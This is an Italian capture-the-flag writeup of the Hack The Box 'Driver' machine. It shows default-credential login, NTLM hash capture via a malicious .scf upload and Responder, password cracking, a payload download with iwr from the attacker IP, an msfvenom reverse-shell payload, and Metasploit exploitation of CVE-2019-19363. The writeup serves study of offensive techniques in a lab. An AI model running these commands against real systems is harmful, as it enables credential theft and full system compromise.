+++
date = '2026-08-28T11:56:29+02:00'
draft = false
title = 'Driver Writeup IT'
+++
**Autore**: **`joy.scd01`**

**Data**: **`22/03/2025`**

![pwn.png](/images/imgs_driver/pwn.png)

---
# Introduzione

**_Driver_** è una macchina **Windows** di difficoltà **Easy** che evidenzia i pericoli derivanti da file share mal configurati e driver obsoleti.

L'initial foothold si basa sull'indovinare delle credenziali di default per un portale web di gestione stampanti. Abusando di una funzionalità di upload del firmware che interagisce con un file share di backend, possiamo caricare un file **`.scf`** malevolo per forzare un tentativo di autenticazione e catturare un **NTLM hash**. Dopo aver craccato l'hash per ottenere l'accesso via **WinRM**, la privilege escalation consiste nell'individuare un driver di stampa **Ricoh** obsoleto e vulnerabile alla **CVE-2019-19363**, richiedendo un pivot su **Metasploit** e una process migration per ottenere una shell stabile come **Administrator**.

---
# Tecniche Utilizzate

- **Malicious File Upload (.scf)**

- **NTLM Hash Capture**

- **Password Cracking**

- **Privesc via Printer Driver Exploitation (CVE-2019-19363)**

---
# Enumerazione

## nmap

Scansione iniziale su tutte le porte:

```bash
nmap -p- driver -Pn
```

```text
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
7680/tcp open  pando-pub
```

Scansione mirata con script e rilevamento servizi:

```bash
nmap -sC -sV driver -Pn
```

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)                  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                          
|_http-server-header: Microsoft-HTTPAPI/2.0 
|_http-title: Not Found                        
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:                             
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s                                
| smb-security-mode:|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-08-27T21:19:01
|_  start_date: 2026-08-27T21:17:33
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

**Porte Aperte**:

- **80**/tcp - HTTP (IIS)

- **135**/tcp - MSRPC

- **445**/tcp - SMB

- **5985**/tcp - WinRM

- **7680**/tcp - Pando-pub

## Enumerazione Web

Sulla pagina web (porta **80**) era presente un semplice form di login.

![web1.png](/images/imgs_driver/web1.png)

Dato che l'output della seconda scansione di **nmap** esponeva esplicitamente "**`Please enter password for admin`**", ho intuito che l'username fosse **admin**.

![pass.png](/images/imgs_driver/pass.png)

Di solito non mi piace tirare a indovinare, quindi inizialmente ho intercettato una richiesta con **Burp Suite** per vedere come venivano passati i parametri, con l'intenzione di passarli ad **Hydra** per un attacco brute-force. La richiesta, però, non mostrava i parametri in modo chiaro. Quindi, prima di passare ad enumerare altri servizi, ho deciso di provare manualmente qualche semplice combinazione: **`admin:password`**, **`admin:root`** e **`admin:admin`**.

Centro con **`admin:admin`**.

![logged.png](/images/imgs_driver/logged.png)

La pagina hostava un **MFP Firmware Update Center**. Un'email sulla pagina leakava il dominio **`driver.htb`**, che ho aggiunto al mio file **`/etc/hosts`**.

---
# Accesso Iniziale | NTLM Capture to WinRM

L'unico pulsante funzionante sul portale era **`Firmware Update`**. Ed era riportato: "**Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.**"

![upload.png](/images/imgs_driver/upload.png)

Inizialmente pensavo ad una webshell. Ma un dettaglio specifico mi ha fatto cambiare completamente approccio: la frase "**to our file share**".

Se il form di upload avesse accettato qualsiasi tipo di file, avrei potuto potenzialmente forzare il server ad autenticarsi verso di me e rubare un **NTLM hash**. Ho provato ad enumerare direttamente le **share SMB**, dato che avere permessi di scrittura avrebbe reso il processo molto più veloce, ma il login anonimo era disabilitato.

Ho deciso quindi di procedere generando un set di file malevoli usando **`ntlm_theft.py`** e testarli uno a uno tramite il form di upload.

**Fonte**: https://github.com/Greenwolf/ntlm_theft

```bash
python3 ntlm_theft.py -g all -s 10.10.15.152 -f fall
```

![theft.png](/images/imgs_driver/theft.png)

Ho iniziato facendo l'upload del payload **`.scf`** dato che era il primo della lista. Il form ha accettato il file e, con **Responder** in ascolto sulla mia macchina, ho catturato quasi istantaneamente un **NTLMv2 hash** per l'utente **`tony`**.

```bash
sudo responder -I tun0
```

![ntlm.png](/images/imgs_driver/ntlm.png)

Ho salvato l'hash in un file e l'ho craccato usando **John the Ripper**:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_driver/john.png)

Password: **`liltony`**.

Per validare le credenziali, ho lanciato un **RID brute-force** su **SMB** giusto per cercare ulteriori dettagli, ma nulla di nuovo:

```bash
nxc smb driver -u tony -p liltony --rid-brute
```

![rid.png](/images/imgs_driver/rid.png)

Successivamente, ho controllato se l'utente avesse privilegi di remote management:

```bash
nxc winrm driver -u tony -p liltony
```

![tonypwn.png](/images/imgs_driver/tonypwn.png)

**`(Pwn3d!)`**. Mi sono connesso usando **Evil-WinRM** e ho recuperato la **user flag**.

```bash
evil-winrm -i driver -u tony -p liltony
```

![userf.png](/images/imgs_driver/userf.png)

---
# Privilege Escalation | CVE-2019-19363

Ho trasferito **WinPEAS** sul target e l'ho eseguito per cercare vettori di local privilege escalation.

```PowerShell
iwr -uri http://10.10.15.152:8000/winp.exe -O winp.exe
.\winp.exe
```

![winptransf.png](/images/imgs_driver/winptransf.png)

Da una prima analisi dell'output non è emerso nulla di ovvio, portandomi a una temporanea fase di stallo. Considerando che il nome del box è **_Driver_**, ho deciso di filtrare specificamente l'output di **WinPEAS** per la parola driver, cercando driver installati e directory non standard. Mi sono imbattuto in questo:

![ricoh.png](/images/imgs_driver/ricoh.png)

Ho fatto qualche ricerca su **Google** su questa specifica versione del driver **Ricoh** e ho scoperto che è vulnerabile alla **CVE-2019-19363**.

**Nota**: _La **CVE-2019-19363** è una local privilege escalation causata da permessi insicuri nella directory del driver **Ricoh**. Gli utenti standard hanno permessi di scrittura su questa cartella, il che permette ad un attaccante di posizionarvi un payload malevolo che verrà poi eseguito con privilegi di **SYSTEM** dal servizio **print spooler**._

Dato che non sono riuscito a trovare un **PoC** per sfruttarla manualmente, ho deciso di usare un modulo di **Metasploit**. Per utilizzarlo, dovevo prima fare l'upgrade della mia sessione standard **WinRM** in una sessione **Meterpreter**.

Ho generato un eseguibile **Windows meterpreter a 64-bit**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.152 LPORT=22667 -f exe > fall.exe
```

Per trasferirlo, ho semplicemente usato la feature upload nativa di **Evil-WinRM**. Tornato su **Metasploit**, ho configurato l'handler:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 22667
run
```

Ho eseguito **`fall.exe`** sul target e ho ottenuto la sessione **meterpreter**.

![meterpreter.png](/images/imgs_driver/meterpreter.png)

Ho mandato la sessione in background e ho caricato il modulo exploit specifico per **Ricoh**:

```bash
use exploit/windows/local/ricoh_driver_privesc
set SESSION 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 22666
exploit
```

![pending.png](/images/imgs_driver/pending.png)

Ho provato a lanciarlo un paio di volte, ma continuava a bloccarsi subito dopo lo step di creazione della stampante malevola.

**Nota**: _Questo tipo di hanging di solito si verifica quando l'exploit si appoggia ad un processo temporaneo instabile o con bassi privilegi che crasha durante l'esecuzione. Per risolvere, bisogna migrare verso un processo più stabile e persistente._

Ho controllato i processi in esecuzione e ho migrato la mia sessione **meterpreter** in **`OneDrive.exe`**, che tipicamente è molto stabile negli ambienti **Windows**. Ho rilanciato l'exploit che mi ha droppato una shell da **Administrator**.

![privesc.png](/images/imgs_driver/privesc.png)

Sul desktop era presente la **root flag**.

![rootf.png](/images/imgs_driver/rootf.png)

---
# Considerazioni Finali

**_Driver_** è un box solido che premia l'attenzione ai dettagli e la capacità di leggere i context clues dell'applicazione ("**our file share**"). La fase di initial access è uno scenario realistico che dimostra come semplici misconfigurazioni nella gestione dei file possano portare alla compromissione totale delle credenziali. La fase di privilege escalation è l'esempio perfetto di come vulnerabilità locali in driver di stampa obsoleti possano essere sfruttate silenziosamente per compromettere l'intero sistema.

**Fonti**: 

- **NTLM Theft by Greenwolf | https://github.com/Greenwolf/ntlm_theft**

